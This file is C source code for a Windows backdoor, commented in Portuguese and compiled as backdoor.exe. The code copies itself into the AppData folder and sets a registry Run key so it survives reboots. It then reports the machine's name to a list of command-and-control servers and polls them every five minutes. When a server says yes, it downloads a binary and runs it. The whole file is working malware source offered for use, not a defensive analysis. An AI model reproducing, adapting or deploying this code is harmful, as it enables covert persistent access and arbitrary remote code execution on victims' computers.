
/*
** Código utilizado para manter acesso em máquinas Windows.
** Autor: Constantine.
** Data: 06/08/2015.
** Compilar: gcc --std=c99 main.c -lws2_32 -mwindows -o backdoor.exe
*/

/* Configurações. */
/* Lista de servidores (C&C). */
#define SERVER_LIST \
	"http://asasasasas.co", \
	"http://google.com", \
	"http://localhost:81/gateway.php", \
	"htt:asaasas..."
	
#define SLEEP_TIME 300 /* Se conecta de 5 em 5 minutos. */
#define MAXLIMIT 256
#define say printf

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Shlobj.h>
#include <Winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>

typedef struct {
	unsigned int status;
	unsigned int length;
	unsigned char *content;
} http_request_t;

typedef struct {
	unsigned int port;
	unsigned int length;
	unsigned char *content;
	unsigned char *domain;
	unsigned char *path;
} url_t;

static unsigned int check_machine_is_infected(void);
static void startup(void);
static void add_registry_key(void);
static void send_infect_to_panel(void);
static void core(void);
static url_t *http_request_parse_url(const unsigned char *url);
static http_request_t *http_get_request(const unsigned char *url);
static http_request_t *http_request_free(http_request_t *request);

int __stdcall WinMain(HINSTANCE instance, HINSTANCE prev, LPSTR line, int cmd){
	WSADATA wsadata;
	if (WSAStartup(MAKEWORD(2,2), &wsadata) != 0)
		return EXIT_FAILURE;
	startup();
	WSACleanup();
	return EXIT_SUCCESS;
}

static void startup(void){
	if (check_machine_is_infected() == FALSE)
		send_infect_to_panel();
	while (1) {
		core();
		Sleep(SLEEP_TIME * 1000);
	}
}

static unsigned int check_machine_is_infected(void){
	unsigned char *strings [] = {
		"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		"File description",
		"\\file.exe",
		NULL
	};
	
	unsigned long type = REG_SZ;
	unsigned char *appdata = NULL;
	unsigned char *path = NULL;
	unsigned char *current = NULL;
	HKEY key;
	
	if ((appdata = (unsigned char *) malloc(sizeof(unsigned char) * MAXLIMIT)) == NULL)
		return FALSE;
	memset(appdata, '\0', sizeof(unsigned char) * MAXLIMIT);
	SHGetFolderPathA(NULL, CSIDL_APPDATA|CSIDL_FLAG_CREATE, NULL, 0, appdata);
	
	if ((path = (unsigned char *) malloc(sizeof(unsigned char) * (strlen(appdata) + MAXLIMIT))) == NULL) {
		free(appdata);
		return FALSE;
	}
	memset(path, '\0', sizeof(unsigned char) * (strlen(appdata) + MAXLIMIT));
	memcpy(path, appdata, strlen(appdata));
	memcpy(&path[strlen(path)], strings[2], strlen(strings[2]));
	
	FILE *handle = NULL;
	if ((handle = fopen(path, "r")) == NULL) {
		if ((current = (unsigned char *) malloc(sizeof(unsigned char) * (MAXLIMIT*2))) == NULL) {
			free(appdata);
			free(path);
			return FALSE;
		}
		memset(current, '\0', sizeof(unsigned char) * (MAXLIMIT*2));
		GetModuleFileNameA( NULL, current, sizeof(unsigned char) * (MAXLIMIT*2));
		CopyFileA(current, path, FALSE);
		
		/* Add registry key startup. */
		FILE *handle = NULL;
		if ((handle = fopen(path, "r")) != NULL) {
			if ((RegCreateKeyEx(HKEY_CURRENT_USER, strings[0], 0, NULL, 
					REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &key, &type)) == ERROR_SUCCESS) {
				RegSetValueEx(key, strings[1], 0, REG_SZ, (BYTE *)path, (unsigned long) strlen(path));
				RegCloseKey(key);
			}
			fclose(handle);
			return FALSE;
		}
	} else {
		fclose(handle);
		return TRUE;
	}
	return FALSE;
}

static void send_infect_to_panel(void){
	unsigned char computer_name [MAXLIMIT];
	unsigned int is_break = FALSE;
	unsigned long size = MAXLIMIT;
	unsigned char *url = NULL;
	unsigned char *servers [] = { SERVER_LIST , NULL};
	unsigned char path [] = "?action=nw&data=";
	http_request_t *request;
	
	GetComputerNameA(computer_name, &size);
	if ((url = (unsigned char *) malloc(sizeof(unsigned char) * (MAXLIMIT*2))) == NULL)
		return;
	
	for (int a=0; servers[a]!=NULL; a++) {
		memset(url, '\0', sizeof(unsigned char) * (MAXLIMIT*2));
		memcpy(url, servers[a], strlen(servers[a]));
		memcpy(&url[strlen(url)], path, strlen(path));
		memcpy(&url[strlen(url)], computer_name, strlen(computer_name));
		request = http_get_request(url);
		is_break = FALSE;
		if (request != NULL) {
			if (request->status == TRUE)
				if (strstr(request->content, "<!DOCTYPE  HTML PUBLIC  \"-//IETF/ /DTD HTML  2.0//EN\">"))
					is_break = TRUE;
			http_request_free(request);
		}
		if (is_break == TRUE)
			break;
	}
	free(url);
}

static void core(void){
	unsigned int is_break = FALSE, is_action = FALSE;
	unsigned long size = MAXLIMIT;
	unsigned char *url = NULL;
	unsigned char *servers [] = { SERVER_LIST , NULL};
	unsigned char *paths [] = { "?action=cw", "?action=rw" };
	http_request_t *request;
	
	if ((url = (unsigned char *) malloc(sizeof(unsigned char) * (MAXLIMIT*2))) == NULL)
		return;
	
	unsigned int a = 0;
	for (a=0; servers[a]!=NULL; a++) {
		memset(url, '\0', sizeof(unsigned char) * (MAXLIMIT*2));
		memcpy(url, servers[a], strlen(servers[a]));
		memcpy(&url[strlen(url)], paths[0], strlen(paths[0]));
		request = http_get_request(url);
		is_break = FALSE;
		if (request != NULL) {
			if (request->status == TRUE)
				if (strstr(request->content, "\r\nYES\r\n")) {
					is_break = TRUE;
					is_action = TRUE;
				}
			http_request_free(request);
		}
		if (is_break == TRUE)
			break;
	}
	
	unsigned int is_droped = FALSE;
	unsigned char *path_final = NULL;
	unsigned char output [] = "\\dropedfile.exe";
	
	if ((path_final = (unsigned char *) malloc(sizeof(unsigned char) * (MAXLIMIT*2))) != NULL) {
		memset(path_final, '\0', sizeof(unsigned char) * (MAXLIMIT*2));
		SHGetFolderPathA(NULL, CSIDL_APPDATA|CSIDL_FLAG_CREATE, NULL, 0, path_final);
		memcpy(&path_final[strlen(path_final)], output, strlen(output));
		
		if (is_action == TRUE) {
			memset(url, '\0', sizeof(unsigned char) * (MAXLIMIT*2));
			memcpy(url, servers[a], strlen(servers[a]));
			memcpy(&url[strlen(url)], paths[1], strlen(paths[1]));
			request = http_get_request(url);
			if (request != NULL) {
				if (request->status == TRUE) {
					char *pointer = NULL;
					if ((pointer = strstr(request->content, "\r\n\r\n")) != NULL) {
						int binary_size = request->length - ((int)((int)pointer - (int)request->content)) - strlen("\r\n\r\n");
						pointer += strlen("\r\n\r\n");
						FILE *handle = NULL;
						if ((handle = fopen(path_final, "wb")) != NULL) {
							fwrite(pointer, sizeof(char), binary_size, handle);
							fclose(handle);
							is_droped = TRUE;
						}
					}
				}
				http_request_free(request);
			}
		}
		
		if (is_droped == TRUE)
			CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) system, path_final, 0, 0);
		Sleep(3000);
		free(path_final);
	}
	
	free(url);
}

static url_t *http_request_parse_url(const unsigned char *url){
	if (!url) return (url_t *) NULL;
	
	url_t *new_url = (url_t *) malloc(sizeof(url_t));
	if (!new_url) 
		return (url_t *) NULL;
	
	new_url->port = 80;
	new_url->length = 0;
	new_url->content = NULL;
	new_url->domain = NULL;
	new_url->path = NULL;
	
	if (!(new_url->content = (unsigned char *) malloc(strlen(url) + 1))) {
		free(new_url);
		return (url_t *) NULL;
	}
	
	memset(new_url->content, '\0', strlen(url) + 1);
	memcpy(new_url->content, url, strlen(url));
	new_url->length = strlen(new_url->content);
	
	if (!new_url->length > 0 || !strlen(new_url->content) > 0) {
		if (new_url->content != NULL) 
			free(new_url->content);
		free(new_url);
		return (url_t *) NULL;
	}
	
	unsigned int start_pointer = 0;
	unsigned char *u_ptr = new_url->content;
	if (strstr(u_ptr, "://")) {
		if (!(u_ptr[0] == 'h' && u_ptr[1] == 't' && u_ptr[2] == 't' && u_ptr[3] == 'p' && 
			  u_ptr[4] == ':' && u_ptr[5] == '/' && u_ptr[6] == '/')) {
			free(new_url->content);
			free(new_url);
			return (url_t *) NULL;
		} else 
			start_pointer = strlen("http://");
	}
	
	u_ptr += start_pointer;
	unsigned int counter = 0;
	unsigned char *c_port = NULL;
	unsigned char *p_ptr = NULL;
	if ((p_ptr = strstr(u_ptr, ":")) != NULL && ++p_ptr) {
		if ((c_port = (unsigned char *) malloc(sizeof(unsigned char) * 10)) != NULL) {
			for (int a=0; p_ptr[a]!='\0'; a++) {
				counter = 0;
				for (int b='0'; b<='9' ; b++)
					if (p_ptr[a] == b)
						counter++;
				if (!counter > 0) {
					c_port[a] = '\0';
					break;
				}
				c_port[a] = p_ptr[a];
			}
			if (c_port != NULL)
				new_url->port = (int) strtol(c_port, NULL, 10);
			free(c_port);
		}
	}
	
	if (new_url->port == 0)
		new_url->port = 80;
	
	if (!new_url->port > 0) {
		if (c_port)
			free(c_port);
		if (new_url->content != NULL) 
			free(new_url->content);
		free(new_url);
		return (url_t *) NULL;
	}
	
	unsigned char *c_domain = NULL;
	if ((c_domain = (unsigned char *) malloc(sizeof(unsigned char) * (256*2))) != NULL) {
		memset(c_domain, '\0', sizeof(unsigned char) * (256*2));
		for (int d=0; d<256; d++) {
			counter = 0;
			for (int a='a',b='A',c='0'; a<='z'; a++,b++) {
				if (u_ptr[d] == a || u_ptr[d] == b || u_ptr[d] == c || 
					u_ptr[d] == '.' || u_ptr[d] == '-')
					counter++;
				if (c <= '9')
					b++;
			}
			if (counter == 0) {
				c_domain[d] = '\0';
				if ((new_url->domain = (unsigned char *) malloc(sizeof(unsigned char) * (d + 1))) != NULL) {
					memset(new_url->domain, '\0', sizeof(unsigned char) * (d + 1));
					memcpy(new_url->domain, c_domain, d);
				}
				break;
			}
			c_domain[d] = u_ptr[d];
		}
		free(c_domain);
	}
	
	if (new_url->domain == NULL) {
		if (c_domain)
			free(c_domain);
		if (c_port)
			free(c_port);
		if (new_url->content != NULL) 
			free(new_url->content);
		free(new_url);
		return (url_t *) NULL;
	}
	
	unsigned char *c_path = NULL;
	if ((c_path = (unsigned char *) malloc( sizeof(unsigned char) * (new_url->length + (256*2)) )) != NULL) {
		memset(c_path, '\0', sizeof(unsigned char) * (new_url->length + (256*2)));
		counter = 0;
		for (int a=0; u_ptr[a]!='\0'; a++) {
			if (u_ptr[a] == '/') {
				counter++;
				break;
			}
		}
		if (counter > 0) {
			unsigned char *p_ptr = strstr(u_ptr, "/");
			if (p_ptr != NULL) {
				unsigned int a = 0;
				for (; p_ptr[a]!='\0'; a++)
					c_path[a] = p_ptr[a];
				if ((new_url->path = (unsigned char *) malloc(sizeof(unsigned char) * (a + 1))) != NULL) {
					memset(new_url->path, '\0', sizeof(unsigned char) * (a + 1));
					memcpy(new_url->path, c_path, a);
				}
			}
		} else {
			unsigned char bar [] = "/";
			if ((new_url->path = (unsigned char *) malloc(sizeof(unsigned char) * (strlen(bar) + 1))) != NULL) {
				memset(new_url->path, '\0', sizeof(unsigned char) * (strlen(bar) + 1));
				memcpy(new_url->path, bar, strlen(bar));
			}
		}
		free(c_path);
	}
	
	if (new_url->path == NULL) {
		if (c_path)
			free(c_path);
		if (c_domain)
			free(c_domain);
		if (c_port)
			free(c_port);
		if (new_url->content != NULL) 
			free(new_url->content);
		free(new_url);
		return (url_t *) NULL;
	}
	
	if (new_url != NULL)
		return new_url;
	
	return (url_t *) NULL;
}

#define FREE_URL_FORMATED \
	url_formated->port = 0;\
	url_formated->length = 0;\
	if (url_formated->content != NULL)\
		url_formated->content = NULL;\
	if (url_formated->domain != NULL)\
		url_formated->domain = NULL;\
	if (url_formated->path != NULL)\
		url_formated->path = NULL
static http_request_t *http_get_request(const unsigned char *url){
	if (!url) return (http_request_t *) NULL;
	
	url_t *url_formated = http_request_parse_url(url);
	if (url_formated == NULL) 
		return (http_request_t *) NULL;
	
	struct hostent *host_information = gethostbyname(url_formated->domain);
	if (host_information == NULL) {
		FREE_URL_FORMATED;
		return (http_request_t *) NULL;
	}
	
	struct sockaddr_in address;
	address.sin_family      = AF_INET;
	address.sin_port        = htons(url_formated->port);
	address.sin_addr.s_addr = *(u_long *) host_information->h_addr_list[0];
	
	int sock = (int)(-1);
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		FREE_URL_FORMATED;
		return (http_request_t *) NULL;
	}
	
	int result = (int)(-1);
	if ((result = connect(sock, (struct sockaddr *)&address, sizeof(address))) < 0) {
		FREE_URL_FORMATED;
		closesocket(sock);
		return (http_request_t *) NULL;
	}
	
	unsigned char *header = NULL;
	if (!(header = (unsigned char *) malloc(sizeof(unsigned char) * ((256*5) + strlen(url) + 1)))) {
		FREE_URL_FORMATED;
		closesocket(sock);
		return (http_request_t *) NULL;
	}
	memset(header, '\0', sizeof(unsigned char) * ((256*5) + strlen(url) + 1));
	sprintf(header, 
		"GET %s HTTP/1.1\r\n"
		"Host: %s\r\n"
		"Connection: close\r\n\r\n", url_formated->path, url_formated->domain);
	
	if (send(sock, header, strlen(header), 0) == -1) {
		FREE_URL_FORMATED;
		free(header);
		closesocket(sock);
		return (http_request_t *) NULL;
	}
	
	result = 0;
	unsigned int is_going = 1;
	unsigned int total_length = 0;
	unsigned char *response = (unsigned char *) malloc(sizeof(unsigned char) * (256*2));
	unsigned char *response_final = (unsigned char *) malloc(sizeof(unsigned char) * (256*2));
	
	if (!response || !response_final) {
		FREE_URL_FORMATED;
		free(header);
		if (response)
			free(response);
		if (response_final)
			free(response_final);
		closesocket(sock);
		return (http_request_t *) NULL;
	}
	
	memset(response, '\0', sizeof(unsigned char) * (256*2));
	memset(response_final, '\0', sizeof(unsigned char) * (256*2));
	
	while (is_going) {
		result = recv(sock, response, (sizeof(unsigned char) * (256*2)) - 1, 0);
		if (result == 0 || result < 0)
			is_going = 0;
		else {
			if ((response_final = (unsigned char *) realloc(response_final, total_length + 
				(sizeof(unsigned char) * (256*2)))) != NULL) {
				memcpy(&response_final[total_length], response, result);
				total_length += result;
			}
		}
	}
	
	unsigned int result_flag = FALSE;
	http_request_t *request = (http_request_t *) malloc(sizeof(http_request_t));
	if (request != NULL) {
		memset(request, 0, sizeof(http_request_t));
		request->status = FALSE;
		request->length = 0;
		request->content = NULL;
		
		if (total_length > 0) {
			request->length = total_length;
			if ((request->content = (unsigned char *) malloc(sizeof(unsigned char) * (request->length+1))) != NULL) {
				memset(request->content, '\0', sizeof(unsigned char) * (request->length+1));
				memcpy(request->content, response_final, request->length);
				request->status = TRUE;
				result_flag = TRUE;
			}
		}
	}
	
	closesocket(sock);
	free(header);
	free(response);
	free(response_final);
	
	url_formated->port = 0;
	url_formated->length = 0;
	if (url_formated->content)
		free(url_formated->content);
	if (url_formated->domain)
		free(url_formated->domain);
	if (url_formated->path)
		free(url_formated->path);
	free(url_formated);
	
	if (result_flag == TRUE)
		return request;
	else {
		if (request != NULL)
			free(request);
	}
	
	return (http_request_t *) NULL;
}

static http_request_t *http_request_free(http_request_t *request){
	if (!request) return (http_request_t *) NULL;
	
	request->length = 0;
	request->status = FALSE;
	free(request->content);
	free(request);
	
	return (http_request_t *) NULL;
}
